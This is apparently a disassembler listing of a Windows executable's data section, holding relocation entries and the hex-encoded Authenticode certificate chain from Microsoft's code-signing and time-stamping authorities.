                dd 3BB23BA3h, 3BC43BBFh, 3BEF3BEAh, 3CB83C14h, 3CCF3CBDh
                dd 3D013CEDh, 3D743D07h, 3D913D80h, 3E343DAEh, 3E643E57h
                dd 3E783E70h, 3E8C3E80h, 3EBD3EB5h, 3EDA3ECEh, 3EF23EE6h
                dd 3F0A3EFEh, 3F223F16h, 3F903F2Eh, 3FBC3FADh, 3FD5h, 6000h
                dd 0A8h, 301F3018h, 30353026h, 30663058h, 30C73078h, 313330F3h
                dd 3196317Ch, 31AD31A7h, 31FB31B5h, 32653216h, 32E132C2h
                dd 33233308h, 337D3353h, 3393338Ah, 33CE33C2h, 3469345Ch
                dd 348B347Eh, 34EA34A2h, 354534F0h, 35C23555h, 363935EAh
                dd 36603659h, 366E3667h, 369B3691h, 36AE36A7h, 36C136BAh
                dd 372A36DBh, 380F3763h, 388B3855h, 395238ADh, 39A83983h
                dd 3A0139DEh, 3A3E3A22h, 3AA33A74h, 3B983B38h, 3C483C32h
                dd 3CEF3C58h, 3D5B3D26h, 3F683E28h, 3F7F3F6Dh, 3FC5h, 7000h
                dd 98h, 3024300Fh, 319D3198h, 31F231AFh, 32BF3253h, 332D3328h
                dd 3378333Fh, 33E53389h, 34B8340Bh, 34CF34BDh, 35593533h
                dd 364C360Ah, 3674366Dh, 36F336C0h, 370E36FBh, 375D3758h
                dd 379A376Fh, 382F37ABh, 38E63851h, 393838F5h, 394F393Dh
                dd 39A43995h, 3A2239B8h, 3B2C3A4Bh, 3C153BFCh, 3C323C26h
                dd 3C703C52h, 3D1E3D0Dh, 3D4E3D44h, 3D993D77h, 3DCB3DA3h
                dd 3E0D3E08h, 3ED03E1Fh, 3F1D3F18h, 3F683F2Fh, 3FD33F79h
                dd 3FF9h, 8000h, 7Ch, 305D3058h, 309B306Fh, 311830CBh
                dd 312F311Dh, 317B3157h, 31BD31B8h, 322831CFh, 326D3268h
                dd 32D6327Fh, 340A3354h, 34173410h, 3425341Eh, 3438342Eh
                dd 34873441h, 34A03499h, 34D834C0h, 35AD35A8h, 35EE35BFh
                dd 363C35FAh, 36A5368Ch, 373936E2h, 37613740h, 389037CAh
                dd 39AE38CEh, 3CA43C8Fh, 3D103CEEh, 3E9D3E98h, 3F243EAFh
                dd 3F86h, 9000h, 78h, 324D3248h, 32FF325Fh, 33893368h
                dd 33C233A0h, 347833D4h, 348F347Dh, 363034E4h, 372E36C8h
                dd 384D3848h, 38C7385Fh, 390D3908h, 3A3D391Fh, 3A8D3A88h
                dd 3AC13A9Fh, 3ADF3ACAh, 3BAC3AF0h, 3BE03BD5h, 3C3E3C03h
                dd 3C683C5Ah, 3CB73C81h, 3D3E3D08h, 3D663D51h, 3DDD3DB7h
                dd 3E183DE4h, 3E2F3E1Dh, 3E763E51h, 3F093EA2h, 3FC1h, 0A000h
                dd 138h, 300D3008h, 3076301Fh, 310E30F5h, 312D311Eh, 3150313Fh
                dd 321E320Dh, 32593237h, 32B23296h, 341233F6h, 342A341Eh
                dd 34463436h, 34693454h, 34823476h, 34923487h, 352134A5h
                dd 35B1357Fh, 35F135D1h, 36393611h, 3662364Ch, 367B3671h
                dd 36853681h, 369D368Bh, 36B836A7h, 36D336C2h, 36EA36E5h
                dd 36F436F0h, 36FF36F9h, 37223711h, 37403731h, 375E374Fh
                dd 3772376Eh, 3784377Ch, 3794378Ch, 37C837A0h, 37EC37DCh
                dd 380837FCh, 38303810h, 38603854h, 38983868h, 38CC38A8h
                dd 38E038D8h, 39243900h, 39383930h, 39603958h, 39843968h
                dd 39C43990h, 39E839C8h, 3A083A04h, 3A483A28h, 3A683A64h
                dd 3A883A84h, 3AA83AA4h, 3AB43AB0h, 3AD03ACCh, 3AF03AECh
                dd 3B103B0Ch, 3B303B2Ch, 3B503B4Ch, 3B703B6Ch, 3B903B8Ch
                dd 3BB03BACh, 3BD03BCCh, 3BF03BECh, 3C103C0Ch, 3C303C2Ch
                dd 3C3C3C38h, 3C583C54h, 3C783C74h, 3C983C94h, 3CB83CB4h
                dd 3CD83CD4h, 3CE43CE0h, 3D003CFCh, 3D203D1Ch, 3D343D28h
                dd 3D54h, 0C000h, 30h, 30043000h, 300C3008h, 301C3018h
                dd 30243020h, 30503030h, 306C3054h, 30A83070h, 30B030ACh
                dd 30C430C0h, 30C8h, 27Ch dup(0)
                dd 3C58h, 20200h, 483C8230h, 862A0906h, 0DF78648h, 0A0020701h
                dd 30393C82h, 2353C82h, 0B310101h, 5060930h, 2030E2Bh
                dd 3000051Ah, 2B0A064Ch, 1040106h, 1023782h, 303EA004h
                dd 617303Ch, 1062B0Ah, 37820104h, 300F0102h, 10309h, 2A204A0h
                dd 21300080h, 5060930h, 2030E2Bh, 400051Ah, 0F5E27614h
                dd 0A3547411h, 3E007593h, 49C27380h, 0FD5E24AFh, 1582A010h
                dd 48230F2h, 38230A0h, 203A088h, 0A020201h, 0EAF51A61h
                dd 0
                dd 0D306A00h, 862A0906h, 0DF78648h, 5050101h, 31793000h
                dd 609300Bh, 6045503h, 53550213h, 11301331h, 4550306h
                dd 570A1308h, 69687361h, 6F74676Eh, 3010316Eh, 5503060Eh
                dd 7130704h, 6D646552h, 31646E6Fh, 61C301Eh, 0A045503h
                dd 694D1513h, 736F7263h, 2074666Fh, 70726F43h, 7461726Fh
                dd 316E6F69h, 6213023h, 3045503h, 694D1A13h, 736F7263h
                dd 2074666Fh, 65646F43h, 67695320h, 676E696Eh, 41435020h
                dd 0D171E30h, 31313131h, 32323130h, 37313933h, 310D175Ah
                dd 30323033h, 34323231h, 5A373139h, 31838130h, 609300Bh
                dd 6045503h, 53550213h, 11301331h, 4550306h, 570A1308h
                dd 69687361h, 6F74676Eh, 3010316Eh, 5503060Eh, 7130704h
                dd 6D646552h, 31646E6Fh, 61C301Eh, 0A045503h, 694D1513h
                dd 736F7263h, 2074666Fh, 70726F43h, 7461726Fh, 316E6F69h
                dd 60B300Dh, 0B045503h, 4F4D0413h, 1E315250h, 3061C30h
                dd 13030455h, 63694D15h, 6F736F72h, 43207466h, 6F70726Fh
                dd 69746172h, 82306E6Fh, 0D302201h, 862A0906h, 0DF78648h
                dd 5010101h, 1820300h, 8230000Fh, 82020A01h, 0C3000101h
                dd 7CCF1FA9h, 1E317F23h, 0DD892506h, 0CFB97975h, 92614B93h
                dd 0EFF295B6h, 779D25AAh, 6D5A4BF3h, 0E0CC9049h, 2A6B831h
                dd 0AF748737h, 60A0ACF2h, 4EC7B894h, 0D887FE25h, 4E20D258h
                dd 653AF12Dh, 0A65B922Eh, 7595E65Dh, 50E534E0h, 397D9C21h
                dd 448EB697h, 0A6166623h, 36E02065h, 9DFA8AEBh, 160CBE2h
                dd 0C8642AFCh, 0F1144587h, 28CDCA1Eh, 57E5BAACh, 0ECDC2659h
                dd 9A6C4AC5h, 291A03E6h, 9E003F32h, 0D25AC83h, 6FDDCC84h
                dd 2DBB6AB6h, 6D3A84F7h, 36E83166h, 9284FF70h, 7640F790h
                dd 472E889Eh, 0F7112BD6h, 6512E08Fh, 0EF5FBC2Bh, 0ECF7FC15h
                dd 45B76801h, 4C0EE0Ch, 0BDB70EB0h, 8DAE6B78h, 35F150E4h
                dd 0D2019EE2h, 715BEBE1h, 20216182h, 0DEC9D4F3h, 4502B81Ch
                dd 7EBE4965h, 0A78637B5h, 0DF5AECCDh, 0FC2076B8h, 0FC511311h
                dd 0AA502AFAh, 3AD01EB4h, 0CA63BE80h, 24781DCh, 1000103h
                dd 1D0182A3h, 19018230h, 3061330h, 4251D55h, 60A300Ch
                dd 1062B08h, 3070505h, 61D3003h, 0E1D5503h, 14041604h
                dd 0E5A60300h, 0A271C4A2h, 768FC382h, 120D2CCDh, 284A9DE2h
                dd 3060E30h, 10F1D55h, 404FF01h, 80070203h, 3061F30h, 4231D55h
                dd 80163018h, 74455714h, 0F6B05D1Ch, 0E00543C8h, 8F2D548Ch
                dd 48FEA732h, 6563096h, 1F1D5503h, 4D304F04h, 49A04B30h
                dd 458647A0h, 70747468h, 632F2F3Ah, 6D2E6C72h, 6F726369h
                dd 74666F73h, 6D6F632Eh, 696B702Fh, 6C72632Fh, 6F72702Fh
                dd 74637564h, 694D2F73h, 646F4363h, 50676953h, 305F4143h
                dd 31332D38h, 3130322Dh, 72632E30h, 65A306Ch, 1062B08h
                dd 1070505h, 304E0401h, 64A304Ch, 1062B08h, 30070505h
                dd 683E8602h, 3A707474h, 77772F2Fh, 696D2E77h, 736F7263h
                dd 2E74666Fh, 2F6D6F63h, 2F696B70h, 74726563h, 694D2F73h
                dd 646F4363h, 50676953h, 305F4143h, 31332D38h, 3130322Dh
                dd 72632E30h, 60D3074h, 48862A09h, 10DF786h, 50501h, 1018203h
                dd 0F8F79000h, 0C8699279h, 608A6B8Fh, 0AEC17CEEh, 5238813Eh
                dd 99CFBAF4h, 3D2DF08Ch, 0F6AEF413h, 3875F061h, 3FC6594Eh
                dd 7F94307h, 0E453C77Ch, 0A8D66291h, 94751476h, 0BAB25986h
                dd 6C7FC210h, 15193F15h, 7E2F0EC3h, 0FECFC339h, 94582754h
                dd 79076135h, 0B057516Dh, 63EAE112h, 66168A72h, 2A399FEBh
                dd 8B350433h, 5E0ADE83h, 1D9FBC31h, 0D4535EEh, 0DF97C75Dh
                dd 7F9DE02Ah, 0E3FB493Ah, 0DF324548h, 6E096D36h, 0AC555576h
                dd 5D79C534h, 0CCD5026Eh, 0A8F38997h, 0EA147D68h, 550B7B69h
                dd 0C48C027Dh, 62BC304Dh, 0ECA57BF7h, 0EF092A0h, 57AF0E2Ah
                dd 0CD48299Bh, 0EAA521B6h, 9DCEF1Dh, 0D662ABF5h, 5F35EC0Dh
                dd 0B1D4996Bh, 0F95277F0h, 6C3FE977h, 5CC05698h, 5E4EA136h
                dd 7A8CF410h, 20209711h, 6E790831h, 1C5F1672h, 0CB9B5730h
                dd 0F555A27Ch, 0EC786C70h, 0AE2043A1h, 8B35B0ECh, 4823018h
                dd 38230BAh, 203A0A2h, 0A020201h, 96190561h, 0
                dd 0D301B00h, 862A0906h, 0DF78648h, 5050101h, 31773000h
                dd 609300Bh, 6045503h, 53550213h, 11301331h, 4550306h
                dd 570A1308h, 69687361h, 6F74676Eh, 3010316Eh, 5503060Eh
                dd 7130704h, 6D646552h, 31646E6Fh, 61C301Eh, 0A045503h
                dd 694D1513h, 736F7263h, 2074666Fh, 70726F43h, 7461726Fh
                dd 316E6F69h, 61F3021h, 3045503h, 694D1813h, 736F7263h
                dd 2074666Fh, 656D6954h, 6174532Dh, 5020706Dh, 1E304143h
                dd 31310D17h, 35323730h, 32343032h, 175A3931h, 3132310Dh
                dd 32353230h, 31323430h, 81305A39h, 300B31B3h, 55030609h
                dd 2130604h, 13315355h, 3061130h, 13080455h, 7361570Ah
                dd 676E6968h, 316E6F74h, 60E3010h, 7045503h, 65520713h
                dd 6E6F6D64h, 301E3164h, 5503061Ch, 15130A04h, 7263694Dh
                dd 666F736Fh, 6F432074h, 726F7072h, 6F697461h, 300D316Eh
                dd 5503060Bh, 4130B04h, 52504F4Dh, 25302731h, 4550306h
                dd 6E1E130Bh, 68706943h, 44207265h, 45204553h, 393A4E53h
                dd 2D383745h, 42343638h, 3933302Dh, 30253144h, 55030623h
                dd 1C130304h, 7263694Dh, 666F736Fh, 69542074h, 532D656Dh
                dd 706D6174h, 72655320h, 65636976h, 22018230h, 9060D30h
                dd 8648862Ah, 1010DF7h, 3000501h, 0F0182h, 0A018230h, 1018202h
                dd 3BCBD300h, 449FA253h, 4DAB7AA3h, 8A537156h, 9337AA77h
                dd 0FD3E017Eh, 53A302ABh, 0B1D1FFA9h, 9000C522h, 0EE6E75E7h
                dd 0E81E818h, 61D8C513h, 0A01FBE00h, 0D043B76h, 0A004C504h
                dd 5343FCA8h, 404A106h, 98920BB9h, 0EF386202h, 0F71233D4h
                dd 0EF7B3D2Bh, 855745ADh, 0D79F2095h, 629C3463h, 0AEBE8E46h
                dd 399ED9E0h, 0FD55A9F6h, 0E677E7CFh, 5CEF1335h, 9348BFE8h
                dd 7431A4Fh, 7F8A3858h, 0EA6C1485h, 7A4BD0C9h, 0D3CB6E82h
                dd 14086015h, 5BA89489h, 3FC93A3Fh, 2F6D7D20h, 0CA7D1A58h
                dd 0C3BC388Ah, 0D86839C2h, 231A582Dh, 8102AEDh, 828C205Ah
                dd 97D1EDA5h, 0CC859245h, 0DF8337C3h, 0C57C980Dh, 99E0B6D3h
                dd 878D853h, 2123E5F5h, 5A866207h, 0FD19696Ah, 3453F970h
                dd 3125F781h, 8B878619h, 0FD9A55C0h, 15354CAAh, 95E95BFDh
                dd 9853ABC9h, 0A52C5F29h, 640F25E1h, 27B0F2C5h, 1030275h
                dd 82A30100h, 82300901h, 1D300501h, 1D550306h, 416040Eh
                dd 0E7237914h, 55BE0DA1h, 2918682Ch, 0D6678262h, 3836E1F3h
                dd 61F305Ah, 231D5503h, 16301804h, 34231480h, 4652D9F8h
                dd 40ED0A70h, 0B3FB76FBh, 35C3B02Bh, 54300FB3h, 1D550306h
                dd 304D041Fh, 0A049304Bh, 8645A047h, 74746843h, 2F2F3A70h
                dd 2E6C7263h, 7263696Dh, 666F736Fh, 6F632E74h, 6B702F6Dh
                dd 72632F69h, 72702F6Ch, 6375646Fh, 4D2F7374h, 6F726369h
                dd 74666F73h, 656D6954h, 6D617453h, 41435070h, 6C72632Eh
                dd 8065830h, 501062Bh, 1010705h, 4A304C04h, 8064830h, 501062Bh
                dd 2300705h, 74683C86h, 2F3A7074h, 7777772Fh, 63696D2Eh
                dd 6F736F72h, 632E7466h, 702F6D6Fh, 632F696Bh, 73747265h
                dd 63694D2Fh, 6F736F72h, 69547466h, 7453656Dh, 50706D61h
                dd 632E4143h, 13307472h, 1D550306h
dword_E4C0      dd 300C0425h, 2B08060Ah, 5050106h, 30080307h, 2A09060Dh
                                        ; DATA XREF: CODE:0000B598↑o
                dd 0F7864886h, 501010Dh, 82030005h, 47000101h, 5B8176C2h
                dd 0D36FDD31h, 7AF2993Ch, 13977E6Ch, 17052C50h, 44B8101Bh
                dd 0F48CB5A1h, 0B0BDCF56h, 6D64B421h, 0EED81C61h, 92F5EBE8h
                dd 18A243EEh, 0FAFAC344h, 5CB6ADEFh, 4B6D977Fh, 27FB43B5h
                dd 54087861h, 0AFF9B17Ch, 74B40A98h, 2DE8AAC4h, 0FE7DC450h
                dd 99A14E7Dh, 0B72827D6h, 0B1DFD8AEh, 8E22838Fh, 0FC79F3CEh
                dd 0BF6D1461h, 0B084CCEBh, 5BBBA3DFh, 54EAB705h, 6C1D62F5h
                dd 4B63A627h, 0FAA1E3FAh, 9685DFBBh, 0B0536965h, 649871B6h
                dd 0C5BD6626h, 0BC625CF1h, 9C3DF491h, 0D00424Bh, 140538CFh
                dd 2ADC5A26h, 6A7F4B05h, 0DDD83899h, 0CEA29973h, 9E24508Ch
                dd 3FF5EBA4h, 54CC788Ah, 66255D99h, 280641A4h, 0B4C449AFh
                dd 0DEEC9452h, 0FE648302h, 4BFFD44Dh, 8029FCA2h, 0AB3FEEDBh
                dd 8833ED3Ch, 6022BFCAh, 43B5CD0h, 98B40AB0h, 3AA73C6Dh
                dd 1D19A4Fh, 8A621116h, 30A07641h, 30070682h, 0A0EF0382h
                dd 2010203h, 16610A02h
                dd 3468h, 1C000000h, 9060D30h, 8648862Ah, 1010DF7h, 30000505h
                dd 3013315Fh, 90A0611h, 93892692h, 1642CF2h, 63031619h
                dd 19316D6Fh, 0A061730h, 89269209h, 642CF293h, 9161901h
                dd 7263696Dh, 666F736Fh, 302D3174h, 5503062Bh, 24130304h
                dd 7263694Dh, 666F736Fh, 6F522074h, 4320746Fh, 69747265h
                dd 61636966h, 41206574h, 6F687475h, 79746972h, 0D171E30h
                dd 34303730h, 32313330h, 39303335h, 320D175Ah, 30343031h
                dd 30333133h, 5A393033h, 0B317730h, 3060930h, 13060455h
                dd 31535502h, 6113013h, 8045503h, 61570A13h, 6E696873h
                dd 6E6F7467h, 0E301031h, 4550306h, 52071307h, 6F6D6465h
                dd 1E31646Eh, 3061C30h, 130A0455h, 63694D15h, 6F736F72h
                dd 43207466h, 6F70726Fh, 69746172h, 21316E6Fh, 3061F30h
                dd 13030455h, 63694D18h, 6F736F72h, 54207466h, 2D656D69h
                dd 6D617453h, 43502070h, 1823041h, 60D3022h, 48862A09h
                dd 10DF786h, 50101h, 0F018203h, 1823000h, 182020Ah, 0A19F0001h
                dd 0DBDFB16Ch, 7C2A9248h, 0E1192E6Bh, 0C5E3E2BDh, 50235199h
                dd 18DDCEADh, 0EE0F244Eh, 4CD1A7D1h, 203074ADh, 0D507EB11h
                dd 49159554h, 92421B94h, 305C98AEh, 6B00DA26h, 0ECBD7BE8h
                dd 0F70F0789h, 0F098040Eh, 0CB1FCC89h, 9D872433h, 1C67F4F2h
                dd 0E77BFC2Ch, 0E7EA1D88h, 0C1A1A34Eh, 8DCA5323h, 9CF45FAh
                dd 0D0AF5ED0h, 0A20442B0h, 936CA6F9h, 0DC28D767h, 86B05346h
                dd 4628E5D0h, 86AC272Eh, 0C52554Fh, 0FB2C03E4h, 3090906Ah
                dd 59F3876Eh, 7EFA9D30h, 0E8B397D6h, 0F87E9721h, 8F313D2h
                dd 526D53B7h, 9F9045B4h, 474A0048h, 29271166h, 0E497A866h
                dd 4A8106D3h, 0A784F9A2h, 9144711h, 0ED849F82h, 1FE7855h
                dd 8501D9Ah, 30100085h, 0DEB7ED46h, 0C4BB4623h, 0AF9F542Dh
                dd 3141781Eh, 0DF9BCC77h, 0A193833Bh, 1DB50261h, 0F7FCB10Dh
                dd 0CE01B29Bh, 0FF544B22h, 0C2C305F9h, 3020B20h, 0A3010001h
                dd 30AB0182h, 30A70182h, 5503060Fh, 101131Dh, 300504FFh
                dd 0FF010103h, 3061D30h, 40E1D55h, 23140416h, 52D9F834h
                dd 0ED0A7046h, 0FB76FB40h, 0C3B02BB3h, 300FB335h, 5503060Bh
                dd 4040F1Dh, 86010203h, 9061030h, 401062Bh, 15378201h
                dd 2030401h, 81300001h, 55030698h, 8104231Dh, 8D813090h
                dd 0AC0E1480h, 56406082h, 25E59727h, 0E12AFC13h, 5995530Ah
                dd 63A1A4E4h, 5F3061A4h, 11301331h, 92090A06h, 0F2938926h
                dd 1901642Ch, 6F630316h, 3019316Dh, 90A0617h, 93892692h
                dd 1642CF2h, 6D091619h, 6F726369h, 74666F73h, 2B302D31h
                dd 4550306h, 4D241303h, 6F726369h, 74666F73h, 6F6F5220h
                dd 65432074h, 66697472h, 74616369h, 75412065h, 726F6874h
                dd 82797469h, 16AD7910h, 0A5A04AA1h, 58734CADh, 2E1307F4h
                dd 6503065h, 1F1D5503h, 47304904h, 43A04530h, 3F8641A0h
                dd 70747468h, 632F2F3Ah, 6D2E6C72h, 6F726369h, 74666F73h
                dd 6D6F632Eh, 696B702Fh, 6C72632Fh, 6F72702Fh, 74637564h
                dd 696D2F73h, 736F7263h, 7274666Fh, 63746F6Fh, 2E747265h
                dd 306C7263h, 2B080654h, 5050106h, 4010107h, 30463048h
                dd 2B080644h, 5050106h, 86023007h, 74746838h, 2F2F3A70h
                dd 2E777777h, 7263696Dh, 666F736Fh, 6F632E74h, 6B702F6Dh
                dd 65632F69h, 2F737472h, 7263694Dh, 666F736Fh, 6F6F5274h
                dd 72654374h, 72632E74h, 6133074h, 251D5503h, 0A300C04h
                dd 62B0806h, 7050501h, 0D300803h, 862A0906h, 0DF78648h
                dd 5050101h, 2820300h, 97100001h, 35CC38Ah, 0E9DD3644h
                dd 0DB77ADB4h, 4D5179CEh, 742EB101h, 0C6D5B71h, 0BECEAB13h
                dd 2EB88F7Bh, 8CA212D4h, 57B8626Dh, 204ECB02h, 0DD995013h
                dd 57E2407Ah, 9A58AFBBh, 11DE11Ch, 78BBAC86h, 0ECD08BF2h
                dd 0E2EE013Bh, 50A8FBEh, 0E2488DC8h, 0DD1553F0h, 0E492AB4Fh
                dd 0D56A8DE7h, 94E6C180h, 852F06F2h, 2A91E903h, 0FB702224h
                dd 78E4FCF6h, 0F70D2E99h, 0BC70E207h, 8E9D4E18h, 95720A6Bh
                dd 9C39A1B8h, 51C52D67h, 5C62EA0Eh, 8B98163Fh, 7E23F20h
                dd 0CCF9321Ah, 31764A31h, 0B722B3Dh, 3D70EAC8h, 130A85FFh
                dd 610AC2DFh, 0B8D7F08Eh, 8B4EEB17h, 2B35C57Fh, 0EBBFA35Eh
                dd 420B7DBCh, 7253D47Bh, 0CA30EE21h, 5C6578BBh, 0A17015Bh
                dd 0DAD20E14h, 3CF59814h, 0B35866B9h, 0F9E72F2Dh, 51CC8685h
                dd 709DE856h, 39AC6C94h, 79F6D44Ch, 7A18AABFh, 0A2EF2962h
                dd 634299Bh, 0C9621A77h, 1F6D1E3Dh, 0C70BF082h, 43CFBB2Ch
                dd 0ECF9E5B3h, 0A4E3B57Dh, 0B83574A8h, 2371C54Eh, 0B762612h
                dd 718C523Ch, 1443465Ah, 0B0B3B3BCh, 9FC8674Dh, 7980FF42h
                dd 159E8021h, 42E86630h, 0C81A5E12h, 0D021229Eh, 0E92BE943h
                dd 0CC48F4BBh, 32D8D42Ch, 2A264C80h, 5A5F2448h, 0A6EF56EAh
                dd 0CA9D99DEh, 81BD6F3Ah, 11067427h, 0BF2176EEh, 27C1829Bh
                dd 6AB1B654h, 76A1893Dh, 0A16EB461h, 0AABFA613h, 6F12F047h
                dd 6C328AFDh, 51DFFEB2h, 0C9238CC8h, 1D9DBD66h, 2641287h
                dd 59AF2D3Dh, 21E4B88Fh, 0CAB0B5E5h, 5478B463h, 2E41D405h
                dd 0B094AC50h, 0B3AB78A5h, 1A7596A0h, 138792D9h, 322F2275h
                dd 0A06E08A8h, 0BF258C5Bh, 0CA84EFA0h, 1EEBD621h, 0EE9AC94Fh
                dd 1F7E049h, 0B896F65h, 0C869C87Dh, 0A7EA6EE6h, 2931CE97h
                dd 5BC50EFFh, 1B4DD85Ch, 2FFAD8A1h, 552E3F9Eh, 13C96B16h
                dd 8230FDA3h, 82308106h, 3A06904h, 2020102h, 815610Ah
                dd 27h, 300C0000h, 2A09060Dh, 0F7864886h, 501010Dh, 5F300005h
                dd 11301331h, 92090A06h, 0F2938926h, 1901642Ch, 6F630316h
                dd 3019316Dh, 90A0617h, 93892692h, 1642CF2h, 6D091619h
                dd 6F726369h, 74666F73h, 2B302D31h, 4550306h, 4D241303h
                dd 6F726369h, 74666F73h, 6F6F5220h, 65432074h, 66697472h
                dd 74616369h, 75412065h, 726F6874h, 30797469h, 300D171Eh
                dd 32313036h, 32333235h, 5A323332h, 37310D17h, 35323130h
                dd 32333332h, 305A3233h, 300B3179h, 55030609h, 2130604h
                dd 13315355h, 3061130h, 13080455h, 7361570Ah, 676E6968h
                dd 316E6F74h, 60E3010h, 7045503h, 65520713h, 6E6F6D64h
                dd 301E3164h, 5503061Ch, 15130A04h, 7263694Dh, 666F736Fh
                dd 6F432074h, 726F7072h, 6F697461h, 3023316Eh, 55030621h
                dd 1A130304h, 7263694Dh, 666F736Fh, 6F432074h, 53206564h
                dd 696E6769h, 5020676Eh, 82304143h, 0D302201h, 862A0906h
                dd 0DF78648h, 5010101h, 1820300h, 8230000Fh, 82020A01h
                dd 9F000101h, 3785DF8Dh, 5606B18Ch, 0D44E3666h, 2336EB0Ah
                dd 0ABAF1E91h, 0C4E9588Dh, 3A9FC1CFh, 0C4C4240Ah, 0EEB05EC4h
                dd 0FAC51415h, 6B33993Eh, 0F4726919h, 0E55F057Ch, 0D7442599h
                dd 908A1935h, 908E28DCh, 90D5EF0Ch, 0DCDEAD61h, 832D7018h
                dd 85AF6FC9h, 0B9DDF82Ch, 71FD30B9h, 0FD831C78h, 82B9A9C8h
                dd 0B87A0D67h, 0BCC209C1h, 3F579716h, 69D3981Ch, 909030D7h
                dd 1F308D90h, 9ED426D8h, 0E2D9887Bh, 4997ED09h, 5204EB45h
                dd 0B87B7581h, 2EB822B5h, 0CFD7BB56h, 0A3C4EA9h, 3AA8A283h
                dd 1B6ADC5h, 22CF6A0Eh, 6C1F23B4h, 0B7E727D5h, 0D5B4C17Eh
                dd 2579AD32h, 0E286421Ch, 57F4859Dh, 2F591BDAh
                dd 2992262Dh, 85D7B3C5h, 5A609EA3h, 9C7BE694h, 34825E7Bh
                dd 0D4FF6D4Bh, 0A2D027EEh, 0C90D1DCh, 150E7DCEh, 34AC887Ch
                dd 986CC0C7h, 44C94A84h, 0DF286879h, 0B80D8322h, 61482C8Ah
                dd 211FEE2h, 1000103h, 230282A3h, 1F028230h, 9061030h
                dd 401062Bh, 15378201h, 2030401h, 1D300001h, 1D550306h
                dd 416040Eh, 74455714h, 0F6B05D1Ch, 0E00543C8h, 8F2D548Ch
                dd 48FEA732h, 60B3096h, 0F1D5503h, 2030404h, 0F30C601h
                dd 1D550306h, 0FF010113h, 3300504h, 30FF0101h, 3069881h
                dd 4231D55h, 81309081h, 0E14808Dh, 406082ACh, 0E5972756h
                dd 2AFC1325h, 95530AE1h, 0A1A4E459h, 3061A463h, 3013315Fh
                dd 90A0611h, 93892692h, 1642CF2h, 63031619h, 19316D6Fh
                dd 0A061730h, 89269209h, 642CF293h, 9161901h, 7263696Dh
                dd 666F736Fh, 302D3174h, 5503062Bh, 24130304h, 7263694Dh
                dd 666F736Fh, 6F522074h, 4320746Fh, 69747265h, 61636966h
                dd 41206574h, 6F687475h, 79746972h, 0AD791082h, 0A04AA116h
                dd 734CADA5h, 1307F458h, 5030652Eh, 1D550306h, 3049041Fh
                dd 0A0453047h, 8641A043h, 7474683Fh, 2F2F3A70h, 2E6C7263h
                dd 7263696Dh, 666F736Fh, 6F632E74h, 6B702F6Dh, 72632F69h
                dd 72702F6Ch, 6375646Fh, 6D2F7374h, 6F726369h, 74666F73h
                dd 746F6F72h, 74726563h, 6C72632Eh, 8065430h, 501062Bh
                dd 1010705h, 46304804h, 8064430h, 501062Bh, 2300705h, 74683886h
                dd 2F3A7074h
dword_EFA0      dd 7777772Fh, 63696D2Eh, 6F736F72h, 632E7466h, 702F6D6Fh
                                        ; DATA XREF: CODE:0000B5B8↑o
                dd 632F696Bh, 73747265h, 63694D2Fh, 6F736F72h, 6F527466h
                dd 6543746Fh, 632E7472h, 76307472h, 1D550306h, 306F0420h
                dd 66B306Dh, 1062B09h, 37820104h, 5E302F15h, 8065C30h
                dd 501062Bh, 2020705h, 4E1E5030h, 6F004300h, 79007000h
                dd 69007200h, 68006700h, 20007400h, 2000A900h, 30003200h
                dd 36003000h, 4D002000h, 63006900h, 6F007200h, 6F007300h
                dd 74006600h, 43002000h, 72006F00h, 6F007000h, 61007200h
                dd 69007400h, 6E006F00h, 13302E00h, 1D550306h, 300C0425h
                dd 2B08060Ah, 5050106h, 30030307h, 2A09060Dh, 0F7864886h
                dd 501010Dh, 82030005h, 30000102h, 0A420B0BCh, 0EFA7A062h
                dd 3D612639h, 99C6ACDCh, 2EC486D0h, 653283F5h, 9B3E225Eh
                dd 0E8F886D6h, 8BCA9FB6h, 0B753BD6h, 4C3E91A1h, 8C7464DDh
                dd 8C88F249h, 0FE6C6718h, 0B8466615h, 9742463Ah, 0D43791C8h
                dd 0ACE7B124h, 1441EAD3h, 0C9D37783h, 0A35F054Fh, 96BF5214h
                dd 563E2FA4h, 0CE75105Bh, 5CEC353h, 65B46954h, 0FA524C9h
                dd 1AB825E1h, 2E54DB9h, 4F1E50B9h, 1D0C98B3h, 22EE0295h
                dd 0CB22AD59h, 40B7405h, 59047B45h, 0B30FD8E0h, 60F84CEBh
                dd 9E78C2DDh, 6B9FBAD1h, 7EEEF3F7h, 0D2401144h, 4B9BBABDh
                dd 0A46E0816h, 0A6E455BEh, 48A31238h, 7A551CF4h, 7DD1208Ah
                dd 94DB91FEh, 7BC22F8Fh, 8564A66Bh, 2CE5A34Fh, 0B5D2934h
                dd 38C7F5BFh, 0C420C42Fh, 69F63156h, 0AF885CEh, 0D6D0EC91h
                dd 538BAAEh, 4F6EEB0Ch, 29039C4Ch, 18FCA2AAh, 0D0C29A0h
                dd 23565C5Ch, 961CDA57h, 3626C80Dh, 0E5CB44C1h, 896FE6E1h
                dd 98E98FE7h, 78D373B5h, 1A3EDE3h, 5EE5743Ch, 21F66CBCh
                dd 0EC056789h, 0B1B59D97h, 0E9A6AFFDh, 34C3A572h, 0F99F2FE1h
                dd 0E2396AF4h, 5B82042Dh, 0AE9CD0FCh, 0F9119D7Ch, 1953B5E6h
                dd 4A39BA74h, 427DEB39h, 373B4AB3h, 7B4AC23Dh, 0E2E79827h
                dd 4A1B9B4Eh, 236A3854h, 0B76ABE37h, 42EAEE48h, 9124490Dh
                dd 2E04B78Eh, 0E7E46F97h, 4D8FBB45h, 0D7D960FDh, 80D8C259h
                dd 7B3460D6h, 2093A1B7h, 0AAB881FEh, 0E9095CA5h, 28BE0D8Ah
                dd 0E8D77E4Dh, 7865ED0Fh, 0B95F31D1h, 42DFDB66h, 2CC0BE7h
                dd 0FFDF8D07h, 45A30620h, 32B3B465h, 0E2912E8Dh, 0C9A9B44Dh
                dd 46BBCFAh, 0EA9FB20Eh, 0C9A4DE9Fh, 8DF4960Ah, 0A898D8F7h
                dd 80285F0h, 0A620A459h, 0F21A0B2Ch, 69ED0652h, 1B1864E5h
                dd 0DEABA3E0h, 61147CCAh, 0F565B843h, 1355A336h, 4D2C672Bh
                dd 314C301Bh, 30DD2582h, 2D92582h, 81300101h, 31793087h
                dd 609300Bh, 6045503h, 53550213h, 11301331h, 4550306h
                dd 570A1308h, 69687361h, 6F74676Eh, 3010316Eh, 5503060Eh
                dd 7130704h, 6D646552h, 31646E6Fh, 61C301Eh, 0A045503h
                dd 694D1513h, 736F7263h, 2074666Fh, 70726F43h, 7461726Fh
